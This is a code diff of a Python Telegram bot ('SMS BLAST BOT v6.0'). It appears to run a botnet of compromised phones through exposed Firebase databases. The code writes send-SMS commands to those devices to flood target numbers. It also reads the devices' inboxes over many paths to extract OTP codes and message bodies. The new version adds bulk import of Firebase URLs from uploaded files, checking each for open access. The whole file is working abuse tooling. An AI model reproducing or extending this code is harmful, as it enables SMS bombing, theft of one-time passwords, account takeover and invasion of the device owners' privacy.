@@ -1,16 +1,13 @@
 # ============================================================
-#  SMS BLAST BOT — v5.2 SANJIPRO FIXED APEX
-#  Send engine = original working format
-#  Free for all • Coins • Get OTP • Full user details
-# ============================================================
-#  pip install aiogram aiohttp
-#  python bot.py
+#  SMS BLAST BOT — v6.0 SANJIPRO APEX
+#  Working send • Fixed OTP • Multi-file firebase import
 # ============================================================
 
 import asyncio, json, logging, os, random, re, signal, string, sys, threading, time
 from copy import deepcopy
 from datetime import datetime
 from html import escape as html_escape
+from urllib.parse import urlparse
 
 import aiohttp
 from aiogram import BaseMiddleware, Bot, Dispatcher, F, Router
@@ -51,7 +48,7 @@ _TMP_FILE = _DATA_FILE + ".tmp"
 _LOCK_FILE = ".sanjipro.lock"
 _HEARTBEAT_FILE = ".sanjipro.heartbeat"
 
-_VERSION = "5.2 Sanjipro"
+_VERSION = "6.0 Sanjipro"
 _START_TIME = time.time()
 
 _WATCHDOG_INTERVAL = 30
@@ -78,7 +75,6 @@ _HTTP_READ_TIMEOUT = 8
 _HTTP_POOL_LIMIT = 1000
 _HTTP_PER_HOST = 100
 _DNS_CACHE_TTL = 600
-_FB_RETRY_COUNT = 0
 _DEVICE_BATCH = 100
 _BACKGROUND_SCAN_INTERVAL = 10.0
 _PROGRESS_UPDATE_INTERVAL = 3.0
@@ -88,7 +84,10 @@ _OTP_LIVE_TIMEOUT = 300
 _OTP_POLL_INTERVAL = 4
 _OTP_COST_DEFAULT = 1
 _OTP_REGEX = re.compile(r"\b\d{4,8}\b")
-_OTP_KEYWORDS = ("otp", "code", "verify", "verification", "pin", "login", "secure", "password")
+_OTP_KEYWORDS = ("otp", "code", "verify", "verification", "pin", "login", "secure", "password", "passcode")
+
+_FB_UPLOAD_WAIT = 3.0
+_URL_REGEX = re.compile(r"https?://[^\s<>\"'\)\]]+")
 
 # ============================================================
 #  EMOJI
@@ -116,6 +115,7 @@ EMOJI_CLOCK    = "5382194935057372936"
 EMOJI_CHART    = "5384369298343860451"
 EMOJI_PLUS     = "5391159900976473065"
 EMOJI_MINUS    = "5393312304441345779"
+EMOJI_FILE     = "5445353826677358176"
 FIRE_EFFECT_ID = "5104841245755180586"
 
 # ============================================================
@@ -179,6 +179,7 @@ LAST_KNOWN_DEVICE_COUNT = 0
 LAST_KNOWN_FB_COUNTS = {}
 
 OTP_LIVE_SESSIONS = {}
+_FB_UPLOAD_BATCH = {}
 
 _BG_TASKS = set()
 
@@ -289,7 +290,7 @@ def _heartbeat():
     except Exception: pass
 
 # ============================================================
-#  HTTP SESSION
+#  HTTP
 # ============================================================
 async def get_http_session():
     global _HTTP_SESSION
@@ -310,7 +311,7 @@ async def close_http_session():
     _HTTP_SESSION = None
 
 # ============================================================
-#  DATA LAYER
+#  DATA
 # ============================================================
 def _default_data():
     return {
@@ -422,7 +423,6 @@ def is_admin(uid, d): return is_owner(uid, d) or uid in d.get("admins", [])
 def is_banned(uid, d): return uid in d.get("banned", [])
 
 def can_use(uid, d):
-    """Always free for all except banned. Only maintenance blocks non-admins."""
     if is_banned(uid, d): return False
     if is_admin(uid, d): return True
     if d.get("settings", {}).get("maintenance"): return False
@@ -527,10 +527,8 @@ def process_referral(new_uid, code, d):
     if d["users"].get(str(new_uid), {}).get("referred_by"): return False, "Already", None
     rc = int(d.get("settings", {}).get("ref_credits", 3))
     rcoin = int(d.get("settings", {}).get("ref_coins", 1))
-    add_credits(new_uid, rc, d, False)
-    add_coins(new_uid, rcoin, d, False)
-    add_credits(referrer_uid, rc, d, False)
-    add_coins(referrer_uid, rcoin, d, False)
+    add_credits(new_uid, rc, d, False); add_coins(new_uid, rcoin, d, False)
+    add_credits(referrer_uid, rc, d, False); add_coins(referrer_uid, rcoin, d, False)
     d["users"][str(new_uid)]["referred_by"] = referrer_uid
     save(d)
     return True, f"+{rc} credits +{rcoin} coins", referrer_uid
@@ -600,8 +598,7 @@ async def safe_edit(cq: CallbackQuery, text: str, markup=None, disable_preview: 
         )
         return
     except TelegramBadRequest as e:
-        if "not modified" in str(e).lower():
-            return
+        if "not modified" in str(e).lower(): return
     except TelegramRetryAfter as e:
         await asyncio.sleep(min(e.retry_after, 5))
     except Exception:
@@ -617,7 +614,6 @@ async def safe_edit(cq: CallbackQuery, text: str, markup=None, disable_preview: 
 #  FIREBASE
 # ============================================================
 async def fb_put(base_url, path, payload):
-    """ORIGINAL working format."""
     url = base_url.rstrip("/") + path
     try:
         sess = await get_http_session()
@@ -630,17 +626,25 @@ async def fb_put(base_url, path, payload):
     except Exception: pass
     return False
 
-async def fb_get(base_url, path):
+async def fb_get_raw(base_url, path):
+    """Return (ok, data_or_text)."""
     url = base_url.rstrip("/") + path
     try:
         sess = await get_http_session()
         async with sess.get(url, timeout=aiohttp.ClientTimeout(total=8)) as r:
+            txt = (await r.text()).strip()
             if r.status == 200:
-                txt = (await r.text()).strip()
-                if txt == "null" or not txt: return None
-                return json.loads(txt)
-    except Exception: pass
-    return None
+                if txt == "null" or not txt: return False, None
+                try: return True, json.loads(txt)
+                except Exception: return True, txt
+            return False, f"HTTP {r.status}"
+    except asyncio.TimeoutError: return False, "timeout"
+    except Exception as e: return False, str(e)[:40]
+
+async def fb_get(base_url, path):
+    ok, data = await fb_get_raw(base_url, path)
+    if not ok: return None
+    return data
 
 def device_is_online(dd):
     return any([
@@ -650,18 +654,24 @@ def device_is_online(dd):
 
 def device_phone(dd):
     if not isinstance(dd, dict): return None
-    for k in ("phoneNumber", "phone", "number", "msisdn", "simNumber"):
+    keys = ("phoneNumber", "phone", "number", "msisdn", "simNumber", "PhoneNumber", "Phone")
+    for k in keys:
         v = dd.get(k)
         if v: return str(v)
-    sims = dd.get("sims") or []
+    # case-insensitive
+    for pk, pv in dd.items():
+        if pk.lower() in [k.lower() for k in keys] and pv:
+            return str(pv)
+    sims = dd.get("sims") or dd.get("sim") or []
+    if isinstance(sims, dict): sims = list(sims.values())
     for s in sims:
         if isinstance(s, dict):
-            for k in ("phoneNumber", "number", "msisdn", "phone"):
+            for k in keys:
                 v = s.get(k)
                 if v: return str(v)
     dev = dd.get("device") or {}
     if isinstance(dev, dict):
-        for k in ("phoneNumber", "phone", "number"):
+        for k in keys:
             if dev.get(k): return str(dev[k])
     return None
 
@@ -693,7 +703,7 @@ async def _fetch_fb(sess, fb, dev_sem, results):
                                             "dev_id": dev_id,
                                             "dev_name": dd.get("deviceName") or dd.get("name") or str(dev_id)[:16],
                                             "phone": device_phone(dd),
-                                            "sims": dd.get("sims", []),
+                                            "sims": dd.get("sims", []) or dd.get("sim", []),
                                             "raw": dd,
                                         }
                     except Exception: pass
@@ -740,13 +750,11 @@ async def scan_all(d):
     return results
 
 # ============================================================
-#  SMS SEND — ORIGINAL WORKING FORMAT
+#  SMS SEND — EXACT FORMAT FROM WORKING FILE
 # ============================================================
 async def sms_via_device(fb_url, dev_id, sim_slot, to, message):
-    """ORIGINAL 3-attempt format — same as v4.0 that was working."""
     ts = int(time.time())
-    to_s = str(to).strip()
-    msg_s = str(message).strip()
+    to_s = str(to).strip(); msg_s = str(message).strip()
     attempts = [
         (f"/clients/{dev_id}/webhookEvent/sendSms.json",
          {"from": sim_slot, "to": to_s, "message": msg_s, "isSended": False, "timestamp": ts}),
@@ -756,12 +764,11 @@ async def sms_via_device(fb_url, dev_id, sim_slot, to, message):
          {"phone": to_s, "text": msg_s, "sim": sim_slot, "timestamp": ts}),
     ]
     for path, payload in attempts:
-        if await fb_put(fb_url, path, payload):
-            return True
+        if await fb_put(fb_url, path, payload): return True
     return False
 
 # ============================================================
-#  OTP — full body + all messages, no time limit
+#  OTP — EXPANDED PATHS + CASE-INSENSITIVE PARSING
 # ============================================================
 def extract_otp(text):
     if not text: return []
@@ -784,82 +791,225 @@ def extract_otp(text):
         seen.add(c); out.append((c, s))
     return out
 
-async def fb_read_messages(fb_url, dev_id):
-    """Try multiple paths and return all messages."""
-    paths = [
+def _msg_paths(dev_id):
+    return [
         f"/clients/{dev_id}/messages.json",
         f"/clients/{dev_id}/sms.json",
         f"/clients/{dev_id}/inbox.json",
         f"/clients/{dev_id}/smsList.json",
+        f"/clients/{dev_id}/receivedSms.json",
+        f"/clients/{dev_id}/received.json",
         f"/clients/{dev_id}/webhookEvent/messages.json",
+        f"/clients/{dev_id}/webhookEvent/sms.json",
+        f"/messages/{dev_id}.json",
+        f"/sms/{dev_id}.json",
+        f"/inbox/{dev_id}.json",
+        f"/devices/{dev_id}/messages.json",
+        f"/devices/{dev_id}/sms.json",
+        f"/received/{dev_id}.json",
     ]
+
+async def fb_read_messages(fb_url, dev_id):
+    """Try many paths, dedupe by msg_id."""
     all_msgs = []
-    for p in paths:
+    for p in _msg_paths(dev_id):
         data = await fb_get(fb_url, p)
         if not data: continue
         msgs = []
         if isinstance(data, dict):
-            for k, v in data.items():
-                if isinstance(v, dict):
-                    msgs.append((k, v))
+            # check if this is a single message (has body-like field)
+            keys_lower = {k.lower() for k in data.keys()}
+            looks_like_msg = any(k in keys_lower for k in ("body", "message", "text", "msg", "content", "address", "sender"))
+            if looks_like_msg:
+                msgs.append((str(int(time.time()*1000)), data))
+            else:
+                for k, v in data.items():
+                    if isinstance(v, dict):
+                        msgs.append((str(k), v))
         elif isinstance(data, list):
             for i, v in enumerate(data):
                 if isinstance(v, dict):
                     msgs.append((str(i), v))
         if msgs:
             all_msgs.extend(msgs)
-    # dedupe by msg_id
+    # dedupe
     seen = set(); out = []
     for mid, pl in all_msgs:
         if mid in seen: continue
         seen.add(mid); out.append((mid, pl))
     return out
 
+def _get_ci(payload, *keys):
+    """Case-insensitive get first matching key."""
+    if not isinstance(payload, dict): return None
+    kls = [k.lower() for k in keys]
+    for k, v in payload.items():
+        if k.lower() in kls:
+            return v
+    return None
+
 def parse_sms_payload(msg_id, payload):
     if not isinstance(payload, dict): return None
-    body = (payload.get("body") or payload.get("message") or
-            payload.get("text") or payload.get("msg") or
-            payload.get("content") or payload.get("sms") or "")
-    sender = (payload.get("address") or payload.get("sender") or
-              payload.get("from") or payload.get("originator") or
-              payload.get("phone") or "Unknown")
-    ts = (payload.get("date") or payload.get("timestamp") or
-          payload.get("time") or payload.get("receivedAt") or
-          payload.get("createdAt") or 0)
-    try: ts = int(ts)
+    body = _get_ci(payload, "body", "message", "text", "msg", "content", "sms", "smsBody", "bodyText", "MessageBody", "Body")
+    sender = _get_ci(payload, "address", "sender", "from", "originator", "phone", "phoneNumber", "senderAddress", "From", "Sender")
+    ts = _get_ci(payload, "date", "timestamp", "time", "receivedAt", "createdAt", "receivedDate", "dateTime", "Date", "Timestamp")
+    try: ts = int(ts) if ts is not None else 0
     except Exception: ts = 0
     if ts > 10_000_000_000: ts = ts // 1000
+    if not body: return None
     return {
         "id": str(msg_id),
         "body": str(body),
-        "sender": str(sender),
-        "ts": ts,
+        "sender": str(sender) if sender else "Unknown",
+        "ts": ts or now_ts(),
     }
 
-async def collect_all_messages(device, limit=200):
-    """Get ALL recent messages from device, no time filter."""
+async def collect_all_messages(device, limit=300):
     msgs = await fb_read_messages(device["fb_url"], device["dev_id"])
     out = []
     for mid, payload in msgs[:limit]:
         parsed = parse_sms_payload(mid, payload)
         if not parsed: continue
-        if not parsed["body"]: continue
         otps = extract_otp(parsed["body"])
         out.append({
             "msg_id": parsed["id"],
             "sender": parsed["sender"],
             "body": parsed["body"],
-            "ts": parsed["ts"] or now_ts(),
+            "ts": parsed["ts"],
             "otps": [o[0] for o in otps[:3]],
             "has_otp": len(otps) > 0,
         })
     out.sort(key=lambda x: -x["ts"])
     return out
 
-async def collect_otps(device, limit=200):
-    """Return only messages that contain OTP."""
-    msgs = await collect_all_messages(device, limit=limit)
-    return [m for m in msgs if m["has_otp"]]
+# ============================================================
+#  FIREBASE IMPORT (URL detection + multi-file)
+# ============================================================
+def extract_urls(text):
+    if not text: return []
+    urls = _URL_REGEX.findall(str(text))
+    seen = set(); out = []
+    for u in urls:
+        u = u.rstrip(".,;:!?)]}\"'")
+        if not u: continue
+        # skip non-firebase-ish
+        try:
+            parsed = urlparse(u)
+            host = (parsed.netloc or "").lower()
+            if not host: continue
+            # skip telegram links
+            if "t.me" in host or "telegram" in host: continue
+            # require either firebase mention OR .firebaseio.com OR .firebasedatabase.app
+            # but also accept generic to be lenient
+        except Exception:
+            continue
+        if u in seen: continue
+        seen.add(u); out.append(u)
+    return out
+
+async def check_firebase_url(url):
+    """Return (ok, note)."""
+    url = url.rstrip("/")
+    sess = await get_http_session()
+    try:
+        async with sess.get(url + "/.json", timeout=aiohttp.ClientTimeout(total=8)) as r:
+            if r.status == 200:
+                # even "null" means reachable firebase
+                return True, "ok"
+            if r.status == 401: return False, "auth required"
+            if r.status == 403: return False, "forbidden"
+            if r.status == 404: return False, "not found"
+            return False, f"HTTP {r.status}"
+    except asyncio.TimeoutError: return False, "timeout"
+    except Exception as e: return False, str(e)[:40]
+
+async def _do_fb_batch(bot, uid):
+    b = _FB_UPLOAD_BATCH.pop(uid, None)
+    if not b: return
+    files = b.get("files", [])
+    chat_id = b.get("chat_id")
+    d = load()
+
+    total_urls = []
+    seen = set()
+    file_stats = []
+    for fname, content in files:
+        urls = extract_urls(content)
+        file_stats.append((fname, len(urls)))
+        for u in urls:
+            if u in seen: continue
+            seen.add(u); total_urls.append(u)
+
+    existing_urls = {fb["url"].rstrip("/") for fb in d.get("firebases", [])}
+
+    added = 0; skipped = 0; failed = 0
+    added_list = []
+    failed_list = []
+    skipped_list = []
+
+    for url in total_urls:
+        if url.rstrip("/") in existing_urls:
+            skipped += 1; skipped_list.append((url, "already")); continue
+        ok, note = await check_firebase_url(url)
+        if not ok:
+            failed += 1; failed_list.append((url, note)); continue
+        # add
+        fbs = d.get("firebases", [])
+        existing_ids = {fb["id"] for fb in fbs}
+        fid = str(int(time.time() * 1000) + random.randint(100, 9999))
+        while fid in existing_ids:
+            fid = str(int(time.time() * 1000) + random.randint(100, 9999))
+        try:
+            host = urlparse(url).netloc or url
+        except Exception:
+            host = url
+        label = host[:30]
+        fbs.append({"id": fid, "url": url.rstrip("/"), "label": label, "added_at": now_ts()})
+        d["firebases"] = fbs
+        existing_urls.add(url.rstrip("/"))
+        added += 1; added_list.append(url)
+
+    save()
+
+    # summary message
+    lines = [f"{em(EMOJI_FILE, '📁')} <b>File Import Result</b>\n"]
+    lines.append(f"📄 Files: <b>{len(files)}</b>")
+    for fname, cnt in file_stats:
+        lines.append(f"   • <code>{esc(fname[:30])}</code> — <b>{cnt}</b> links")
+    lines.append("")
+    lines.append(f"🔗 URLs found: <b>{len(total_urls)}</b>")
+    lines.append(f"{em(EMOJI_CHECK, '✅')} Added: <b>{added}</b>")
+    lines.append(f"{em(EMOJI_WARNING, '⚠️')} Skipped: <b>{skipped}</b>")
+    lines.append(f"{em(EMOJI_CROSS, '❌')} Failed: <b>{failed}</b>")
+    lines.append("")
+    if added_list:
+        lines.append(f"<b>Added URLs:</b>")
+        for u in added_list[:10]:
+            lines.append(f"   ✅ <code>{esc(u[:60])}</code>")
+        if len(added_list) > 10:
+            lines.append(f"   <i>+{len(added_list)-10} more</i>")
+    if failed_list:
+        lines.append(f"\n<b>Failed:</b>")
+        for u, r in failed_list[:5]:
+            lines.append(f"   ❌ <code>{esc(u[:40])}</code> — {esc(r)}")
+    lines.append(f"\n{em(EMOJI_FIRE, '🔥')} Total firebases: <b>{len(d.get('firebases', []))}</b>")
+
+    txt = "\n".join(lines)
+    if len(txt) > 4000: txt = txt[:3990] + "\n<i>...</i>"
+
+    try:
+        await bot.send_message(chat_id, txt,
+            reply_markup=kb([(sc('view firebases'), "owner:fb:menu:0"),
+                             (sc('back'), "owner:home")]),
+            parse_mode="HTML", disable_web_page_preview=True)
+    except Exception: pass
+
+async def _fb_batch_worker(bot, uid):
+    try:
+        await asyncio.sleep(_FB_UPLOAD_WAIT)
+    except asyncio.CancelledError:
+        return
+    await _do_fb_batch(bot, uid)
 
 # ============================================================
 #  FSM
@@ -875,10 +1025,8 @@ class S(StatesGroup):
     add_plan_name = State(); add_plan_price = State()
     add_plan_credits = State(); add_plan_coins = State()
     add_plan_currency = State(); add_plan_link = State()
-    add_credits_amount = State()
-    deduct_credits_amount = State()
-    add_coins_amount = State()
-    deduct_coins_amount = State()
+    add_credits_amount = State(); deduct_credits_amount = State()
+    add_coins_amount = State(); deduct_coins_amount = State()
     add_all_credits_amount = State(); deduct_all_credits_amount = State()
     redeem_code = State()
     gen_redeem_currency = State()
@@ -1040,16 +1188,19 @@ def fb_menu_kb(d, page=0):
     per = 8; tp = max(1, (len(fbs) + per - 1) // per)
     page = max(0, min(page, tp - 1)); start = page * per
     curr = fbs[start:start + per]
-    rows = [[btn("add firebase", "owner:fb:add", EMOJI_PLUS, "➕"),
-             btn("add via txt", "owner:fb:add_file", EMOJI_PLUS, "📄")]]
+    rows = [
+        [btn("add firebase", "owner:fb:add", EMOJI_PLUS, "➕"),
+         btn("add via txt", "owner:fb:add_file", EMOJI_FILE, "📄")],
+        [btn("bulk add (multi-file)", "owner:fb:add_multi", EMOJI_FILE, "📁")]
+    ]
     for fb in curr:
         lbl = fb.get("label", fb["url"].replace("https://", ""))
         if len(lbl) > 16: lbl = lbl[:14] + ".."
         rows.append([btn(lbl, "noop", EMOJI_FIRE, "🔥"),
                      btn("remove", f"owner:fb:del:{fb['id']}:{page}", EMOJI_CROSS, "🗑")])
     nav = []
-    if page > 0: nav.append(btn("prev", f"owner:fb:menu:{page - 1}", EMOJI_GEAR, "◀️"))
-    if page < tp - 1: nav.append(btn("next", f"owner:fb:menu:{page + 1}", EMOJI_GEAR, "▶️"))
+    if page > 0: nav.append(btn("prev", f"owner:fb:menu:{page-1}", EMOJI_GEAR, "◀️"))
+    if page < tp - 1: nav.append(btn("next", f"owner:fb:menu:{page+1}", EMOJI_GEAR, "▶️"))
     if nav: rows.append(nav)
     rows.append([btn("back", "owner:home", EMOJI_GEAR, "🔙")])
     return InlineKeyboardMarkup(inline_keyboard=rows)
@@ -1093,7 +1244,7 @@ def _fb_summary():
         age = int(time.time() - fd.get("last_update", 0))
         s = em(EMOJI_CHECK, "🟢") if age < 60 else em(EMOJI_WARNING, "🟡") if age < 300 else em(EMOJI_CROSS, "🔴")
         lines.append(f"  {s} {esc(str(fd.get('label', 'N/A'))[:20])}: <b>{int(fd.get('online', 0)) * CURRENT_POWER_MODE}</b> ᴀᴘɪs")
-    if len(source) > 5: lines.append(f"  {em(EMOJI_STAR, '➕')} +{len(source) - 5} more...")
+    if len(source) > 5: lines.append(f"  {em(EMOJI_STAR, '➕')} +{len(source)-5} more...")
     return "\n".join(lines) if lines else f"  {em(EMOJI_WARNING, '😴')} ɴᴏ ᴅᴀᴛᴀ"
 
 def owner_panel_text(d):
@@ -1123,7 +1274,6 @@ def owner_panel_text(d):
         f"{em(EMOJI_CROWN, '👑')} sᴜᴘᴇʀ ᴀᴅᴍɪɴs  : <b>{len(owners)}</b>/6\n"
         f"{em(EMOJI_SHIELD, '🛡')} ᴀᴅᴍɪɴs        : <b>{len(admins)}</b>\n"
         f"{em(EMOJI_USER, '👥')} ᴛᴏᴛᴀʟ ᴜsᴇʀs   : <b>{len(users)}</b>\n"
-        f"{em(EMOJI_VIDEO, '📹')} ᴠɪᴅᴇᴏs        : <b>{len(d.get('videos', []))}</b>\n"
         f"{em(EMOJI_MONEY, '💰')} ᴛᴏᴛᴀʟ ᴄʀᴇᴅɪᴛs : <b>{total_credits}</b>\n"
         f"{em(EMOJI_COIN, '🪙')} ᴛᴏᴛᴀʟ ᴄᴏɪɴs  : <b>{total_coins}</b>\n"
         f"{em(EMOJI_CHECK, '📤')} ᴛᴏᴛᴀʟ sᴇɴᴛ    : <b>{stats.get('total_sent', 0)}</b>\n"
@@ -1133,7 +1283,6 @@ def owner_panel_text(d):
         f"{em(EMOJI_GIFT, '🆓')} ᴀᴄᴄᴇss ᴍᴏᴅᴇ   : {em(EMOJI_CHECK, '🟢')} ғʀᴇᴇ ғᴏʀ ᴀʟʟ\n"
         f"{em(EMOJI_BELL, '📢')} ғᴏʀᴄᴇ ᴊᴏɪɴ   : {fj_s}\n"
         f"{em(EMOJI_WARNING, '🔧')} ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ  : {m_s}\n"
-        f"{em(EMOJI_MONEY, '💳')} ᴘʟᴀɴs         : <b>{len(d.get('pricing', {}).get('plans', []))}</b>\n"
         f"{em(EMOJI_LOCK, '🔒')} ᴘʀᴏᴛᴇᴄᴛᴇᴅ    : <b>{len(PROTECTED_NUMBERS)}</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
         f"{em(EMOJI_PHONE, '📱')} <b>ᴘᴇʀ ғɪʀᴇʙᴀsᴇ</b>\n{_fb_summary()}\n"
@@ -1207,7 +1356,7 @@ def user_home_text(uid, d):
     )
 
 # ============================================================
-#  BACKGROUND TASKS
+#  BACKGROUND
 # ============================================================
 async def send_fire(bot, chat_id):
     try:
@@ -1226,7 +1375,7 @@ async def send_fire(bot, chat_id):
 async def send_log(bot, text):
     try:
         await bot.send_message(LOG_CHANNEL_ID, text, parse_mode="HTML", disable_web_page_preview=True)
-    except Exception as e: log.error(f"Channel log failed: {e}")
+    except Exception: pass
 
 async def send_video(bot, chat_id, caption=""):
     try:
@@ -1248,8 +1397,7 @@ async def backup_loop(bot):
                                         document=FSInputFile(_DATA_FILE),
                                         caption=cap, parse_mode="HTML")
         except asyncio.CancelledError: raise
-        except Exception as e:
-            log.error(f"Backup failed: {e}"); await asyncio.sleep(60)
+        except Exception: await asyncio.sleep(60)
 
 async def scanner_loop(bot):
     global CACHED_DEVICES, LAST_SCAN_TIME, LAST_SCAN_DURATION, SCANNING_IN_PROGRESS
@@ -1297,12 +1445,10 @@ async def scanner_loop(bot):
             log.info(f"[SCAN] {len(devices)} devices | {dur:.1f}s | err: {len(FB_SCAN_ERRORS)}")
             if devices and not first_done:
                 try:
-                    shown = len(devices) * CURRENT_POWER_MODE
                     await bot.send_message(MAIN_OWNER,
                         f"{em(EMOJI_ROCKET, '🚀')} <b>SCANNER ACTIVE!</b>\n\n"
-                        f"{em(EMOJI_PHONE, '📱')} Devices: <b>{len(devices)}</b>\n"
-                        f"{em(EMOJI_FIRE, '🔥')} APIs: <b>{shown}</b>\n"
-                        f"{em(EMOJI_STAR, '🔢')} Mode: <b>{CURRENT_POWER_MODE}x</b>",
+                        f"📱 Devices: <b>{len(devices)}</b>\n"
+                        f"🔥 APIs: <b>{len(devices)*CURRENT_POWER_MODE}</b>",
                         parse_mode="HTML")
                 except Exception: pass
                 first_done = True
@@ -1325,7 +1471,6 @@ async def supervised(name, func, bot):
             log.error(f"[SUP] {name} crashed: {e}", exc_info=True)
             await asyncio.sleep(backoff); backoff = min(backoff * 2, 60)
         else:
-            log.warning(f"[SUP] {name} ended, restarting")
             await asyncio.sleep(5)
 
 async def watchdog_loop(bot):
@@ -1338,18 +1483,16 @@ async def watchdog_loop(bot):
                 if me is None: raise RuntimeError("get_me None")
                 fails = 0
             except asyncio.TimeoutError:
-                fails += 1; log.warning(f"[WATCHDOG] Timeout ({fails}/{_WATCHDOG_MAX_FAILS})")
-            except Exception as e:
-                fails += 1; log.warning(f"[WATCHDOG] Fail ({fails}/{_WATCHDOG_MAX_FAILS}): {e}")
+                fails += 1
+            except Exception:
+                fails += 1
             if fails >= _WATCHDOG_MAX_FAILS:
-                log.critical("[WATCHDOG] Max fails → restart")
                 raise RuntimeError("Watchdog restart")
         except asyncio.CancelledError: raise
         except RuntimeError: raise
-        except Exception as e:
-            log.error(f"[WATCHDOG] Unexpected: {e}")
+        except Exception:
             fails += 1
-            if fails >= _WATCHDOG_MAX_FAILS: raise RuntimeError("Watchdog unexpected")
+            if fails >= _WATCHDOG_MAX_FAILS: raise
 
 async def heartbeat_loop():
     while True:
@@ -1372,20 +1515,17 @@ async def owner_panel_refresher(bot):
                         _OWNER_PANEL_STATE.pop(uid, None); continue
                     await bot.edit_message_text(
                         text=owner_panel_text(d),
-                        chat_id=st["chat_id"],
-                        message_id=st["msg_id"],
-                        reply_markup=owner_kb(d),
-                        parse_mode="HTML",
-                    )
+                        chat_id=st["chat_id"], message_id=st["msg_id"],
+                        reply_markup=owner_kb(d), parse_mode="HTML")
                 except TelegramRetryAfter as e:
                     await asyncio.sleep(min(e.retry_after, 30))
                 except TelegramBadRequest: pass
                 except Exception: pass
         except asyncio.CancelledError: raise
-        except Exception as e: log.error(f"Refresher loop: {e}")
+        except Exception: pass
 
 # ============================================================
-#  BLAST ENGINE — original working flow
+#  BLAST
 # ============================================================
 async def blast(bot, msg, uid, number, message, count, devices, speed=SPEED_DEFAULT):
     if not devices:
@@ -1393,7 +1533,7 @@ async def blast(bot, msg, uid, number, message, count, devices, speed=SPEED_DEFA
     pm = CURRENT_POWER_MODE
     cap = len(devices) * pm
     if count > cap:
-        await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Max <b>{cap}</b>. Auto-adjust.", parse_mode="HTML")
+        await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Max <b>{cap}</b>.", parse_mode="HTML")
         count = cap
     if count <= 0:
         await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid.", parse_mode="HTML"); return
@@ -1406,7 +1546,7 @@ async def _run_blast(bot, msg, uid, number, message, count, devices, speed, pm):
         if uid in USER_SESSIONS:
             old = USER_SESSIONS[uid]
             if old.task and not old.task.done():
-                await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Blast already running!", parse_mode="HTML"); return
+                await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Blast running!", parse_mode="HTML"); return
             del USER_SESSIONS[uid]
         session = UserSession(uid)
         session.number = number
@@ -1424,8 +1564,7 @@ async def _run_blast(bot, msg, uid, number, message, count, devices, speed, pm):
     sent_ok = 0; sent_fail = 0; msgs_left = count
     api_delta = {}; last_upd = time.time(); start = time.time()
     edit_lock = asyncio.Lock()
-    eff_conc = min(len(devices), _SEND_CONCURRENCY)
-    sem = asyncio.Semaphore(eff_conc)
+    sem = asyncio.Semaphore(min(len(devices), _SEND_CONCURRENCY))
 
     async def upd_progress(force=False):
         nonlocal last_upd
@@ -1439,7 +1578,7 @@ async def _run_blast(bot, msg, uid, number, message, count, devices, speed, pm):
                     progress_text(sent_ok, sent_fail, count, live, slabel),
                     reply_markup=stop_kb() if not session.cancelled else None,
                     parse_mode="HTML")
-            except TelegramRetryAfter as e: await asyncio.sleep(e.retry_after + 1)
+            except TelegramRetryAfter as e: await asyncio.sleep(e.retry_after+1)
             except Exception: pass
 
     async def send_one(device, pass_num):
@@ -1468,8 +1607,7 @@ async def _run_blast(bot, msg, uid, number, message, count, devices, speed, pm):
                             session.blast_data["users"][k]["uses"] = session.blast_data["users"][k].get("uses", 0) + 1
                         session.blast_data.setdefault("sms_history", {}).setdefault(str(uid), []).append({
                             "number": number, "message": str(message)[:100],
-                            "timestamp": now_ts(), "status": "sent"
-                        })
+                            "timestamp": now_ts(), "status": "sent"})
                 else: sent_fail += 1
                 if fb_id not in api_delta: api_delta[fb_id] = {"sent": 0, "failed": 0}
                 api_delta[fb_id]["sent" if ok else "failed"] += 1
@@ -1489,7 +1627,7 @@ async def _run_blast(bot, msg, uid, number, message, count, devices, speed, pm):
                 if tasks: await asyncio.gather(*tasks, return_exceptions=True)
                 if speed > 0: await asyncio.sleep(speed)
         except asyncio.CancelledError: raise
-        except Exception as e: log.error(f"[LOOP] uid={uid}: {e}", exc_info=True)
+        except Exception as e: log.error(f"[LOOP] uid={uid}: {e}")
         finally:
             async with session.lock:
                 session.sent = sent_ok; session.failed = sent_fail
@@ -1515,8 +1653,7 @@ async def _run_blast(bot, msg, uid, number, message, count, devices, speed, pm):
                 df.setdefault("sms_history", {}).setdefault(str(uid), []).append({
                     "number": number, "message": str(message)[:100],
                     "timestamp": now_ts(),
-                    "status": "completed" if not session.cancelled else "stopped"
-                })
+                    "status": "completed" if not session.cancelled else "stopped"})
                 save(df)
             else:
                 df = session.blast_data if session.blast_data else load()
@@ -1533,8 +1670,7 @@ async def _run_blast(bot, msg, uid, number, message, count, devices, speed, pm):
     await upd_progress(force=True)
     dur = max(1, int(time.time() - start))
     rate = sent_ok / dur
-    log_activity(load(), "sms_blast", uid,
-                 f"sent={sent_ok} failed={sent_fail} total={count} dur={dur}s rate={rate:.1f} pm={pm}x")
+    log_activity(load(), "sms_blast", uid, f"sent={sent_ok} failed={sent_fail}")
     save()
     try:
         ci = await bot.get_chat(uid)
@@ -1544,17 +1680,15 @@ async def _run_blast(bot, msg, uid, number, message, count, devices, speed, pm):
         u_name = load().get("users", {}).get(str(uid), {}).get("name", "Unknown")
         u_uname = "None"
     _spawn(send_log(bot,
-        f"🚀 <b>SMS BLAST</b>\n\n"
-        f"👤 {esc(u_name)}\n🆔 <code>{uid}</code>\n🌐 {esc(u_uname)}\n"
+        f"🚀 <b>SMS BLAST</b>\n\n👤 {esc(u_name)}\n🆔 <code>{uid}</code>\n"
         f"📞 <code>{esc(number)}</code>\n💬 <code>{esc(str(message)[:100])}</code>\n"
         f"✅ {sent_ok} | ❌ {sent_fail} | 📊 {count}\n"
-        f"🔢 {pm}x | ⚡ {rate:.1f}/s | ⏱ {fmt_duration(dur)}\n"
-        f"🛑 {'STOPPED' if was_cancel else 'COMPLETED'}"))
+        f"🔢 {pm}x | ⚡ {rate:.1f}/s"))
     icon = em(EMOJI_CHECK, "✅") if sent_fail == 0 and sent_ok > 0 else em(EMOJI_WARNING, "⚠️") if sent_ok > 0 else em(EMOJI_CROSS, "❌")
     ctxt = ""
     if is_regular:
-        ctxt = f"\n{em(EMOJI_MONEY, '💰')} Used: <b>{sent_ok}</b> | Left: <b>{get_user_credits(uid, load())}</b>"
